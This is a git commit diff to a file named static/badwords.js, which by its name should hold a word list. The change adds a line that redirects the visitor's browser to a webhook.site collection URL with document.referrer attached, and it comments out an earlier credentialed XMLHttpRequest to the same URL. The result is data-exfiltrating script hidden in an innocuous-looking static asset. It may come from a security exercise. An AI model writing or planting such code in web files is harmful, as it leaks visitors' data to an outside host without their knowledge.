823fabf8ef8f0a1fc525efd3d21806066fc8054a
SovietBeast <44019881+SovietBeast@users.noreply.github.com>
2021-05-15 22:21:11 +0200

    Update badwords.js

--- static/badwords.js
+++ static/badwords.js
@@ -1,4 +1,5 @@
-var req = new XMLHttpRequest();
-req.open("GET", "https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=", true);
-req.witthCredentials = true;
-req.send(null)
+location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c="+document.referrer
+//var req = new XMLHttpRequest();
+//req.open("GET", "https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=", true);
+//req.witthCredentials = true;
+//req.send(null)
